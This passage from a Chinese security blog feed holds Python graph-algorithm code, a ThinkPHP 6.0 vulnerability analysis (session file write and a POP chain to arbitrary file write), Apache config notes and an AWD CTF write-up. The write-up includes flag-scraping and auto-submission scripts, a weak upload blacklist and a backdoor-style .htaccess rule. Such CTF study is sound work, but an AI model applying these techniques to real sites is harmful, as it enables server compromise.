class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>输入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入格式：</span><br><span class="line">4 4</span><br><span class="line">0 1 1 0</span><br><span class="line">1 0 1 0</span><br><span class="line">1 1 0 1</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure><p>读入数据，创建邻接矩阵</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_table</span><span class="params">()</span>-&gt;list:</span></span><br><span class="line">    m,n = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> input().split()] <span class="comment"># 自动解包</span></span><br><span class="line">    A = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        A[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> input().split()]</span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure><p>邻接矩阵转换为邻接表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_Adj</span><span class="params">(A)</span>-&gt;list:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    邻接矩阵转换为邻接表</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    G = [VNode() <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A))]</span><br><span class="line">    <span class="keyword">for</span> i,vex <span class="keyword">in</span> enumerate(A):</span><br><span class="line">        <span class="comment"># 第i个节点，及其所有的边</span></span><br><span class="line">        <span class="keyword">for</span> node,j <span class="keyword">in</span> enumerate(vex):</span><br><span class="line">            <span class="keyword">if</span> j != <span class="number">0</span>:</span><br><span class="line">                p = ArcNode(node, j)</span><br><span class="line">                p.next = G[i].next</span><br><span class="line">                G[i].next = p</span><br><span class="line">    <span class="keyword">return</span> G</span><br></pre></td></tr></table></figure><p>打印邻接表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disp_adj</span><span class="params">(G)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> index,i <span class="keyword">in</span> enumerate(G):</span><br><span class="line">        p = i.next</span><br><span class="line">        print(index, end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">while</span> p != <span class="literal">None</span>:</span><br><span class="line">            print(<span class="string">" &#123;&#125;-&gt;"</span>.format(p.adjvex), end=<span class="string">""</span>)</span><br><span class="line">            p = p.next</span><br><span class="line">        print()</span><br></pre></td></tr></table></figure><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">visited = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DFS</span><span class="params">(G, v)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    深度优先搜索</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    visited[v] = <span class="number">1</span></span><br><span class="line">    print(v, end=<span class="string">""</span>)</span><br><span class="line">    p = G[v].next</span><br><span class="line">    <span class="keyword">while</span> p != <span class="literal">None</span>:</span><br><span class="line">        w = p.adjvex</span><br><span class="line">        <span class="keyword">if</span> visited[w] == <span class="number">0</span>:</span><br><span class="line">            DFS(G,w)</span><br><span class="line">        p = p.next</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BFS</span><span class="params">(G, v)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    广度优先搜索</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    q = Queue()</span><br><span class="line">    visited = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(G))]</span><br><span class="line">    print(v,end=<span class="string">""</span>)</span><br><span class="line">    visited[v] = <span class="number">1</span></span><br><span class="line">    q.put(v)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        w = q.get()</span><br><span class="line">        p = G[w].next</span><br><span class="line">        <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> visited[p.adjvex] == <span class="number">0</span>:</span><br><span class="line">                print(p.adjvex, end=<span class="string">""</span>)</span><br><span class="line">                visited[p.adjvex] = <span class="number">1</span></span><br><span class="line">                q.put(p.adjvex)</span><br><span class="line">            p = p.next</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dijkstra</span><span class="params">(A, v)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Dijkstar 算法</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        <span class="keyword">for</span> index,value <span class="keyword">in</span> enumerate(i):</span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">-1</span>:</span><br><span class="line">                i[index] = sys.maxsize</span><br><span class="line">    </span><br><span class="line">    dist = A[v] <span class="comment"># 原始v到各个顶点的距离</span></span><br><span class="line"></span><br><span class="line">    path = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A))] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A)):</span><br><span class="line">        <span class="keyword">if</span> A[v][i] != <span class="number">-1</span>:</span><br><span class="line">            path[i] = v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path[i] = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    s = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A))]</span><br><span class="line">    s[v] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A)):</span><br><span class="line">        mindis = sys.maxsize</span><br><span class="line">        <span class="comment"># 寻找最小路径长度顶点u</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(A)):</span><br><span class="line">            <span class="keyword">if</span> s[j] == <span class="number">0</span>  <span class="keyword">and</span> dist[j] &lt; mindis:</span><br><span class="line">                u = j</span><br><span class="line">                mindis = dist[j]</span><br><span class="line">        </span><br><span class="line">        s[u] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(A)):</span><br><span class="line">            <span class="keyword">if</span> s[j] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> A[u][j] &lt; sys.maxsize <span class="keyword">and</span> dist[j] &gt; <span class="number">0</span> <span class="keyword">and</span> dist[u]+A[u][j] &lt; dist[j]:</span><br><span class="line">                    dist[j] = dist[u] + A[u][j]</span><br><span class="line">                    path[j] = u</span><br><span class="line">    <span class="keyword">return</span> path, dist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp6.0漏洞分析</title>
      <link href="/posts/314a66d3/"/>
      <url>/posts/314a66d3/</url>
      
        <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * session_id设置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $id session_id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span><span class="params">($id = null)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对sessionid的校验不严</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 保存session数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">        <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451656966.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (string) $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>][<span class="number">0</span>] ?? <span class="string">"\Opis\Closure\serialize"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $serialize($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src= "/img/loading.gif" data-src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache配置文件简单记录</title>
      <link href="/posts/a3f2ee6b/"/>
      <url>/posts/a3f2ee6b/</url>
      
        <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src= "/img/loading.gif" data-src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src= "/img/loading.gif" data-src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        # The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line">        # the server uses to identify itself. This is used when creating</span><br><span class="line">        # redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line">        # specifies what hostname must appear in the request&#39;s Host: header to</span><br><span class="line">        # match this virtual host. For the default virtual host (this file) this</span><br><span class="line">        # value is not decisive as it is used as a last resort host regardless.</span><br><span class="line">        # However, you must set it for any further virtual host explicitly.</span><br><span class="line">        #ServerName www.example.com</span><br><span class="line"></span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line">        # error, crit, alert, emerg.</span><br><span class="line">        # It is also possible to configure the loglevel for particular</span><br><span class="line">        # modules, e.g.</span><br><span class="line">        #LogLevel info ssl:warn</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">        # For most configuration files from conf-available&#x2F;, which are</span><br><span class="line">        # enabled or disabled at a global level, it is possible to</span><br><span class="line">        # include a line for only one particular virtual host. For example the</span><br><span class="line">        # following line enables the CGI configuration for this host only</span><br><span class="line">        # after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">        #Include conf-available&#x2F;serve-cgi-bin.conf</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src= "/img/loading.gif" data-src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟3月AWD比赛</title>
      <link href="/posts/f1d265cd/"/>
      <url>/posts/f1d265cd/</url>
      
        <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port = [<span class="number">20180</span>,<span class="number">20280</span>,<span class="number">20380</span>,<span class="number">20480</span>,<span class="number">20580</span>,<span class="number">20680</span>,<span class="number">20780</span>,<span class="number">20880</span>,<span class="number">20980</span>,<span class="number">21080</span>,<span class="number">21180</span>,<span class="number">21280</span>,<span class="number">21380</span>,<span class="number">21480</span>,<span class="number">21580</span>,<span class="number">21680</span>,<span class="number">21780</span>,<span class="number">21880</span>,<span class="number">21980</span>,<span class="number">22080</span>,<span class="number">22180</span>,<span class="number">22280</span>,<span class="number">22380</span>,<span class="number">22480</span>]</span><br><span class="line">url = <span class="string">'http://ip:&#123;port&#125;/login.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> port:</span><br><span class="line">    r = requests.get(url=url.format(port=str(i)))</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(re.findall(<span class="string">r"(flag&#123;.*&#125;)"</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">send_url = <span class="string">'http://ip:8001/api/v1/challenges/attempt'</span></span><br><span class="line">cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> submit_flag:</span><br><span class="line">    data = &#123;<span class="string">"challenge_id"</span>:<span class="number">2</span>,<span class="string">"submission"</span>:flag&#125;</span><br><span class="line">    requests.post(url=send_url,data=data,cookies=cookie)</span><br></pre></td></tr></table></figure><p>最后合并为十分钟交一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    port = [<span class="number">20180</span>,<span class="number">20280</span>,<span class="number">20380</span>,<span class="number">20480</span>,<span class="number">20580</span>,<span class="number">20680</span>,<span class="number">20780</span>,<span class="number">20880</span>,<span class="number">20980</span>,<span class="number">21080</span>,<span class="number">21180</span>,<span class="number">21280</span>,<span class="number">21380</span>,<span class="number">21480</span>,<span class="number">21580</span>,<span class="number">21680</span>,<span class="number">21780</span>,<span class="number">21880</span>,<span class="number">21980</span>,<span class="number">22080</span>,<span class="number">22180</span>,<span class="number">22280</span>,<span class="number">22380</span>,<span class="number">22480</span>]</span><br><span class="line">    url = <span class="string">'http://ip:&#123;port&#125;/login.php'</span></span><br><span class="line">    submit_flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> port:</span><br><span class="line">        r = requests.get(url=url.format(port=str(i)))</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                submit_flag.append(re.findall(<span class="string">r"(flag&#123;.*&#125;)"</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    send_url = <span class="string">'http://ip:8001/api/v1/challenges/attempt'</span></span><br><span class="line">    cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2'</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> submit_flag:</span><br><span class="line">        data = &#123;<span class="string">"challenge_id"</span>:<span class="number">2</span>,<span class="string">"submission"</span>:flag&#125;</span><br><span class="line">        req = requests.post(url=send_url,data=data,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            print(<span class="string">'提交正确'</span>)</span><br><span class="line">    sleep(<span class="number">600</span>)</span><br></pre></td></tr></table></figure><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];</span><br><span class="line">$ext&#x3D;pathinfo($name)[&#39;extension&#39;];</span><br><span class="line">$ext &#x3D;strtolower($ext);</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .html .md</span><br></pre></td></tr></table></figure><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span 